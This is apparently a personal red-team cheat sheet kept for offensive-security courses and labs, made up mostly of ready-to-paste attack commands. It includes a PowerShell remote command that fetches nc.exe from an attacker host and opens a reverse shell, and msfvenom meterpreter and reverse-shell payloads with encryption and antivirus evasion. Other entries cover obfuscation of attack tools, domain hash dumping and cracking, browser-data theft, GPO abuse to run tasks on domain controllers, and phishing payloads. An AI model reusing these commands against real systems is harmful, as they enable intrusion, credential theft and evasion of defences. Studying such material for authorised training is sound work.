# Lab_Notes
Collection of red team things used in labs and courses that might be useful

- CRTO  	https://www.zeropointsecurity.co.uk/red-team-ops 
- RASTALABS 	https://www.hackthebox.eu/newsroom/prolab-rastalabs 

- TODO
  - OSEP 	https://www.offensive-security.com/pen300-osep/

Mix of homebrew / others tooling, very much a curated collection of references to copy and paste.


Fanboy moment:
- https://github.com/grugq 
- https://github.com/chryzsh
- https://github.com/HarmJ0y
- https://github.com/rasta-mouse
- https://github.com/TheWover
- https://github.com/byt3bl33d3r
- https://github.com/jfmaes


Fucking great ippsec like dashlane search 
- https://vysecurity.rocks/?#

rockyou2021 link
- https://pastebin.com/HmgmWh20

Poggy simple sig based evasion
- https://luemmelsec.github.io/Circumventing-Countermeasures-In-AD/

Traffic smuggling / evasion 
- https://offensivedefence.co.uk/posts/covenant-profiles-templates/

AMSI/AV
- https://rastamouse.me/memory-patching-amsi-bypass/

Shellcode runners C/C++ very  c h i n a
- https://uknowsec.cn/posts/notes/shellcode%E5%8A%A0%E8%BD%BD%E6%80%BB%E7%BB%93.html

EoP file write
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---privileged-file-write

Yes
- https://media.discordapp.net/attachments/716539014563364905/851058875448819712/7d9b377d640adc0j80gv.png?width=552&height=484

***

Subnet mask / CIDR / IPV4 Calculator
- https://www.adminsub.net/ipv4-subnet-calculator/10.10.120.0/255.255.254.0


***

**weird phishing**
- ms-word://ofe/%7Cu%7Chttp://example.com/myTestDocument.docx
- =cmd|' /c notepad'!A0

General phishing
- https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Phishing.md


DDE's
- https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1559.002/T1559.002.md

- https://github.com/payloadbox/csv-injection-payloads

***

**Quieter Host Recon:**
```
echo %userdomain
%echo %logonserver
%echo %homepath
%echo %homedrive
%net share
net accounts
systeminfo
tasklist /svc
gpresult /z
net localgroup Administrators 
netsh advfirewall show allprofilesstate
systeminfo 
$env:ComSpec
$env:USERNAME
$env:USERDOMAIN
$env:LOGONSERVER
tree $home 
```

***
Get-EventLog -LogName "Application" | where {$_.Message -like '*username*' -or $_.Message -like '*password*' -or $_.Message -like '*pass*'} | select Message | format-table -wrap



****

Sticky notes
```powershell
ls $env:LocalAppData\Packages\Microsoft.MicrosoftStickyNotes_XXXXXXXXXXXXXXXXXX\LocalState
```

****

Capping hashes from beachhead:
- https://github.com/Kevin-Robertson/Inveigh

```powershell
. .\Inveigh-OBFUSCATED.ps1;Invoke-Inveigh -ConsoleOutput Y -Elevated N -FileOutput Y -FileOutputDirectory C:\software\.poon -FileUnique Y
```

****


**Quieter exec:**
- powershell ([char]45+[char]101+[char]99) YwBhAGwAYwA=



***

```powershell
$pass=(ConvertTo-SecureString "Passw0rd!" -AsPlainText -Force); $cred=(New-Object System.Management.Automation.PSCredential("TEST\Administrator", $pass)); Invoke-Command -ComputerName pc-1 -Credential $cred -ScriptBlock { wget http://attacker-ip/nc.exe -O C:\Users\Public\nc.exe; C:\Users\Public\nc.exe -e C:\Windows\system32\nc.exe attacker-ip 4444 }
```

**Fucking with netsh:**
```powershell
$pass=(ConvertTo-SecureString "Passw0rd!" -AsPlainText -Force); 
$cred=(New-Object System.Management.Automation.PSCredential("test.local\Administrator", $pass)); 
Invoke-Command -ComputerName pc-2.test.local -Credential $cred -ScriptBlock {
    netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8080 connectaddress=10.0.0.X
    netsh advfirewall firewall add rule name="My Sweet Local Port" dir=in action=allow protocol=TCP localport=8080
}
```


***
**Obfuscation, patching and evasion**

Just read these blogs , trust me.
- https://rastamouse.me/memory-patching-amsi-bypass/
- https://labs.f-secure.com/blog/attack-detection-fundamentals-2021-windows-lab-1/
- https://labs.f-secure.com/blog/attack-detection-fundamentals-2021-windows-lab-2/



**Cleaning SharpGPOAbuse:**

- https://antiscan.me/images/result/Mm36m1tv5sYN.png
- https://labs.f-secure.com/tools/sharpgpoabuse/
- https://github.com/FSecureLABS/SharpGPOAbuse
- https://mkaring.github.io/ConfuserEx/
- https://github.com/mkaring/ConfuserEx.git


oof.crproj
```csproj
<project outputDir="C:\tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\CONFUSED" baseDir="C:\tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\" xmlns="http://confuser.codeplex.com">
  <rule pattern="true">
    <protection id="anti debug" />
    <protection id="anti dump" />
    <protection id="anti ildasm" />
    <protection id="anti tamper" />
    <protection id="constants" />
    <protection id="ctrl flow" />
    <protection id="invalid metadata" />
    <protection id="ref proxy" />
    <protection id="resources" />
  </rule>
  <module path="C:\tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe">
    <rule pattern="true" preset="maximum" inherit="false" />
  </module>
  <module path="..\..\..\packages\CommandLineParser.1.9.3.15\lib\CommandLine.dll">
    <rule pattern="true" preset="maximum" inherit="false" />
  </module>
  <probePath>C:\tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\</probePath>
</project>
```



***
SharpLoader
- https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader


1. RUN https://github.com/the-xentropy/xencrypt on the loader to drop to a CIFS share on prem

```
Invoke-Xencrypt -infile C:\tools\Invoke-SharpLoader\Invoke-SharpLoader.ps1 -outfile C:\tools\Invoke-SharpLoader\Invoke-SharpLoader-OBFUSCATED.ps1 -Iterations 100
```


2. Then Encrypt SharpGPOAbuse as it gets flagged
```powershell
Invoke-SharpEncrypt -file C:\CSharpFiles\SafetyKatz.exe -password S3cur3Th1sSh1t -outfile C:\CSharpEncrypted\SafetyKatz.enc
```

Upload to CIFS share on prem where 'Invoke-SharpLoader-OBFUSCATED.ps1' was uploaded
And decrypt/run with args

```
Assembly /assemblyname:"SharpGPOAbuse" /parameters:"--AddComputerTask --TaskName \"Legit Task\" --Author NT AUTHORITY\SYSTEM --Command \"cmd.exe\" --Arguments \"/c powershell -nop -w hidden -enc [...snip...]\" --GPOName \"Another Totally Legit GPO\""
```


```powershell
Invoke-SharpLoader -location C:\EncryptedCSharp\Rubeus.enc -password S3cur3Th1sSh1t -argument kerberoast -argument2 "/format:hashcat"
```

***
https://adsecurity.org/?p=2604
```powershell
## Malware
function SuperDecrypt
{
param($script)
$bytes = [Convert]::FromBase64String($script)
## XOR “encryption”
$xorKey = 0x42
for($counter = 0; $counter -lt $bytes.Length; $counter++)
{
$bytes[$counter] = $bytes[$counter] -bxor $xorKey
}
[System.Text.Encoding]::Unicode.GetString($bytes)
}
$decrypted = SuperDecrypt “FUIwQitCNkInQm9CCkItQjFCNkJiQmVCEkI1QixCJkJlQg==”
Invoke-Expression $decrypted
```




***
```powershell
Import-Module .\PowerView.ps1
$Username = 'administrator'
$Password = 'peepeepoopoo'
$pass = ConvertTo-SecureString -AsPlainText $Password -Force
$Cred = New-Object System.Management.Automation.PSCredential -ArgumentList $Username,$pass
Set-DomainUserPassword -Identity Domain_Admin_username -Password $pass -Credential $Cred
```
***

- https://www.dsinternals.com/en/
- https://attack.stealthbits.com/ntds-dit-security-active-directory

```powershell
Compress-Archive -Path C:\Users\Public\Downloads\poon -DestinationPath C:\Users\Public\Downloads\poon.zip
```


#Install-Module DSInternals -Force

```powershell
Import-Module DSInternals
$Key = Get-BootKey -SystemHiveFilePath C:\Users\p4yl0ad\Desktop\AD\poon\registry\SYSTEM
 
Get-ADDBAccount -BootKey $Key -DatabasePath 'C:\Users\p4yl0ad\Desktop\AD\poon\Active Directory\ntds.dit' -All |
  Format-Custom -View HashcatNT | 
  Out-File C:\Users\p4yl0ad\Desktop\AD\poon\Hashdump.txt
 ```
 
./kwp -z basechars/full.base keymaps/en-us.keymap routes/2-to-16-max-3-direction-changes.route > kwp3.txt


 
 
hashcat -m 1000 -a 0 Hashdump.txt -o Cracked.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

hashcat -m 1000 -a 0 Hashdump.txt -o Cracked-otrta.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt -r /usr/share/hashcat/rules/otrta.rule

hashcat -m 1000 -a 3 --custom-charset1=?l?d?u --username -o cracked.txt .\Hashdump.txt ?1?1?1?1?1?1?1?1


**Ran out of options:**
```
hashcat -m 13100 -a 0 --outfile hashnamecracked.txt hash.txt /opt/SecLists/Passwords/*.txt --force -r
/usr/share/hashcat/rules/best64.rule
```

```bash
#!/bin/bash

list=$(find /opt/SecLists/Passwords -type f | grep -i ".txt")

for file in $list
do
	echo $file
	hashcat -m 1000 -a 0 -O -w 3 --outfile cracked-hashes.txt hashes.txt $file --force -r /usr/share/hashcat/rules/best64.rule
done
```

```bash
#!/bin/bash

list=$(find /opt/SecLists/Passwords -type f | grep -i ".txt")

for file in $list
do
	echo $file
	hashcat -m 1000 -a 0 -O -w 3 --outfile cracked-hashes.txt hashes.txt $file --force -r /usr/share/hashcat/rules/otrta.rule
done
```




***




```
shell new-gpo -name ropeoftheneck | new-gplink -target "OU=Domain Controllers,DC=DOMAIN,DC=LOCAL" -LinkEnabled Yes -Enforced Yes -Order 1 
```
```
shell .\SharpGPOAbuse-merge.exe --addcomputertask --taskname "getpooned" --author "DOMAIN\administrator" --command "cmd.exe" --arguments "/c \Windows\system32\spool\drivers\color\launcher.bat" --gponame "ropeoftheneck" --force 
```
```
gpupdate /force 
```







****
Shortcut with powershell
```powershell
$TargetFile = "$env:SystemRoot\System32\calc.exe"
$ShortcutFile = "C:\experiments\cpl\calc.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$Shortcut.TargetPath = $TargetFile
$Shortcut.Save()
```

****

- https://offensivedefence.co.uk/posts/covenant-profiles-templates/

```csharp
//stager mods
public static string GetMessageFormat
{
         get
         {
                  var sb = new StringBuilder(@"{{""GUID"":""{0}"",");
                  sb.Append(@"""Type"":{1},");
                  sb.Append(@"""Meta"":""{2}"",");
                  sb.Append(@"""IV"":""{3}"",");
                  sb.Append(@"""EncryptedMessage"":""{4}"",");
                  sb.Append(@"""HMAC"":""{5}""}}");
                  return sb.ToString();
         }
}
                  
//then                  
string MessageFormat = GetMessageFormat;
```

```csharp
//executor mods
private static string EncryptedMessageFormat
{
         get
         {
                  var sb = new StringBuilder(@"{{""GUID"":""{0}"",");
                  sb.Append(@"""Type"":{1},");
                  sb.Append(@"""Meta"":""{2}"",");
                  sb.Append(@"""IV"":""{3}"",");
                  sb.Append(@"""EncryptedMessage"":""{4}"",");
                  sb.Append(@"""HMAC"":""{5}""}}");
                  return sb.ToString();
         }
}
//then
private static string GruntEncryptedMessageFormat = EncryptedMessageFormat;

```






****

Browser D33ts:
- https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1
```
(crto_cov) > powershell Get-BrowserData -Browser All

Cannot find path 'C:\Users\p4yl0ad\AppData\Local\Google\Chrome\User Data\Default\History' because it does not exist.


Browser User  DataType Data                                                                               
------- ----  -------- ----                                                                              
IE      p4yl0ad History  https://p4yl0ad.github.io/                                                     
IE      p4yl0ad History  https://p4yl0ad.github.io/                                                              
IE      p4yl0ad History  https://p4yl0ad.github.io/

```



****

exe
```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=tun0 LPORT=443 --arch x64 --platform windows --encoder x64/xor_dynamic --encrypt-iv --encrypt
rc4 --encrypt-key neoncatkeysignature --iterations 60 --timeout 10 -b '\x00' -n 22 -x kitty-0.74.4.11.exe -f exe > neoncat1.exe
```

Encrypting C# shellcode
```
msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=192.168.152.100 LPORT=80 -f csharp --encrypt aes256 --encrypt-key 12345678901234567890123456789012 --encrypt-iv 1234567890123456
```

generate a csharp bytearray with msf

`msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=192.168.152.100 LPORT=80 -f csharp -o reverse-tcp.txt`
`msfvenom --platform windows -p windows/x64/exec CMD='cmd.exe /c start calc.exe' -f powershell`


Utilize Simple Loader to create an encoded b64 string and insert into the loader
`git clone https://github.com/cribdragg3r/Simple-Loader.git`

```C:\Tools>C:\Tools\Simple-Loader\Simple-Loader\bin\Debug\Simple-Loader.exe reverse-tcp.txt
[i] Encrypting Data
[i] Replace the hiphop variable with your new payload:

         String hiphop = "ZxOy1Bks+Vfrlq8wcmyHY8GwwiBZd8NGrGQiKvx15hcv9sQ9apoO6NGbNBxAeS4NLHSz4owcdPgQTTejYJr80Ke4ynoy41yrc5R+D0uqt1ppyxDAeYGATQy7xFbN247gwFee5cPZAFyBzbI6DvOLBFSJiP6+4kv5T7pX3iapVsX7ORmg7Ubfa1M9P/cYNm5qzS9dyHxFde/D578YA6DGYC0/UPzmeDXB11R0MWmPAkRGFftQp+YdurMHce1R4HC9bdCXIO3fdx7Gjy/pDwzh9eMtApiQa1B0Y7ZcEWj0LLHwl0kvAodjTX+M+tQJrsFmA53OcwzDlzlVD6YFXP9uOegIOif+bPSKnCXU0aRaY+U7RRr3QbBCfMtwAm1G6bwHrL6q1jeeWeZN+sWxZbCHnW6mNAOGeV/aG8qod5AqhlIXeIGomvKoPs4bxZ2wNEd7";
```

Remove all strings that are trigger words e.g. comments and "shellcode" "meterpreter" etc etc 

Utilize confuserEX to obfuscate the binary generated by the output 
git clone https://github.com/yck1509/ConfuserEx.git


****
DPAPI
```powershell
$exfil = Get-Content -Path C:\Users\Public\Downloads\oof.txt | ConvertTo-SecureString ; [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR((($exfil))))

Import-Module .\FileCryptography.psm1
$key = 'AhXpFs[...REDACTED...]LxlUqc0Y='
Unprotect-File .\exfil.txt.AES AES $key
```
****


**Byte array for combo with shellc loader**
```powershell
$bytes = [System.IO.File]::ReadAllBytes("Grunt.bin");
$bytes -join ","
```

****

Current Users SID no whoami /all:
cmd.exe /c wmic useraccount where name='%username%' get sid
Covenant:
shellcmd wmic useraccount where name='%username%' get sid



SI 0 -> SI >=1?
- https://github.com/antonioCoco/RunasCs


*****

**Converting kirbi to base64 for covenant imports
```
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\IEUser\Desktop\golden.kirbi"))
```


****


**Using a web proxy with (new-object net.webclient)downloadstring:**
```powershell
$Username="Hugo"
$Password="abcdefgh"
$WebProxy = New-Object System.Net.WebProxy("http://webproxy:8080",$true)
$url="http://aaa.bbb.ccc.ddd/rss.xml"

$WebClient = New-Object net.webclient

$WebClient.Proxy=$webproxy
$WebClient.proxy.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)
$path="C:\Users\hugo\xml\test.xml"
$WebClient.DownloadFile($url, $path)

```

***
**weird file permissions:**
```powershell
$path = C:\Users\administrator\Desktop\secrets.txt
$acl=get-acl $path
$accessrule = New-Object system.security.AccessControl.FileSystemAccessRule("DOMAIN\user.name","Read",,,"Allow")
$acl.RemoveAccessRuleAll($accessrule)
Set-Acl -Path $path -AclObject $acl
```
Or
```powershell
get-acl C:\Users\administrator\Desktop\desktop.ini | Set-Acl C:\Users\administrator\Desktop\secrets.txt
```


